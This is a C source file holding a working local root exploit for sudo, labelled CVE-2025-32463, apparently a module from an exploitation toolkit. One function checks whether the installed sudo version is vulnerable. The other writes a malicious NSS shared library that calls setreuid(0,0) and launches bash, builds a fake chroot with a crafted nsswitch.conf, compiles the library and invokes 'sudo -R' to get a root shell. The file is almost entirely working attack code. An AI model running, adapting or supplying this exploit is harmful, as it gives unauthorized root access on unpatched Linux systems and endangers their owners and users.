#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <errno.h>

/*
 * Following code will be executed as root. It is written down in one line for simplicity
 *
 * #include <stdlib.h>
 * #include <unistd.h>
 *
 * __attribute__((constructor)) void xoot(void)
 * {
 *       setreuid(0,0);
 *       setregid(0,0);
 *
 *       chdir("/");
 *
 *       execl("/bin/bash", "/bin/bash", NULL);
 * }
*/
const char XOOT[] = "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void xoot(void)\n{\n        setreuid(0,0);\n        setregid(0,0);\n\n        chdir(\"/\");\n\n        execl(\"/bin/bash\", \"/bin/bash\", NULL);\n}\n";

/*
 * Check if sudo version is vulnerable (1.9.14 < 1.9.17p1)
 * Returns 1 if vulnerable, 0 if not
 */
int cve_2025_32463_scan(void) {
    // Check if sudo exists
    if (access("/usr/bin/sudo", F_OK) != 0) {
        return 0;  // sudo not installed
    }

    // Get sudo version
    FILE* fp = popen("sudo --version 2>&1 | head -1", "r");
    if (!fp) {
        return 0;
    }
    
    char version_line[256];
    if (!fgets(version_line, sizeof(version_line), fp)) {
        pclose(fp);
        return 0;
    }
    pclose(fp);
    
    // Parse version: "Sudo version 1.9.16" or "Sudo version 1.9.16p1"
    // Vulnerable: 1.9.14 <= version < 1.9.17p1
    int major = 0, minor = 0, patch = 0, subpatch = 0;
    if (sscanf(version_line, "Sudo version %d.%d.%d", &major, &minor, &patch) < 3) {
        // Try with subpatch: "1.9.16p1"
        if (sscanf(version_line, "Sudo version %d.%d.%dp%d", &major, &minor, &patch, &subpatch) < 3) {
            return 0;  // Cannot parse version
        }
    }
    
    // Check if version is vulnerable
    // Vulnerable: 1.9.14 <= version < 1.9.17p1
    if (major == 1 && minor == 9) {
        if (patch >= 14 && patch < 17) {
            return 1;  // Vulnerable (1.9.14 to 1.9.16)
        }
        if (patch == 17 && subpatch == 0) {
            return 1;  // Vulnerable (1.9.17 without patch)
        }
        if (patch == 17 && subpatch > 0) {
            return 0;  // Patched (1.9.17p1 or higher)
        }
    }
    
    return 0;  // Not vulnerable
}

/*
 * Auxiliar function for running commands in C using execvp
*/
static void runCommand(char *argv[]) {
    pid_t p = fork();
    if (p == 0) {
        execvp(argv[0], argv);
        perror("execvp");
        _exit(1);
    }
    waitpid(p, NULL, 0);
}

/*
 * Main function
*/
int cve_2025_32463_execute(void) {

    puts(
        "************************************\n"
        "*                                  *\n"
        "*          CVE-2025-32463          *\n"
        "*                                  *\n"
        "************************************\n"
    );

    puts("[+] Running exploit!");

    // Create temp folder - The Xs will be replaced by random characters
    char stage[] = "/tmp/sudo.stage.XXXXXX";

    // Check if folder is not already created
    while (!mkdtemp(stage)) {
        if (errno != EEXIST) {
            perror("mkdtemp");
            return 1;
        }
        // Delete the folder if it is created
        runCommand((char *[]){"rm", "-rf", stage, NULL});
    }

    // Change directory to the temp folder created
    chdir(stage);

    // Copy the code for getting root privileges into a new file
    FILE *f = fopen("xoot.c", "w");
    if (f == NULL) {
        perror("fopen");
        return 1;
    }

    fprintf(f, XOOT);
    fclose(f);

    // Creation of structure folders
    runCommand((char *[]){"mkdir", "-p", "xoot/etc", "libnss_", NULL});

    // Configuring custom NSS module
    // NSS will interpret /xoot as a custom service
    runCommand((char *[]){"sh", "-c", "echo 'passwd: /xoot' > xoot/etc/nsswitch.conf", NULL});

    // If the file /etc/group doesn't exist inside chroot, the exploit will be aborted
    // This is because sudo also needs to know things such as the groups an user belogs to
    runCommand((char *[]){"cp", "/etc/group", "xoot/etc", NULL});

    // Compiles the file xoot.c as a shared library (.so)
    // The function xoot will be automaticlly called after loading the library
    runCommand((char *[]){"gcc", "-shared", "-fPIC", "-Wl,-init,xoot", "-o", "libnss_/xoot.so.2", "xoot.c", NULL});

    puts("xoot!");

    // Root permission granted. -R = --chroot
    runCommand((char *[]){"sudo", "-R", "xoot", "xoot", NULL});
    runCommand((char *[]){"rm", "-rf", stage, NULL});

    return 0;
}
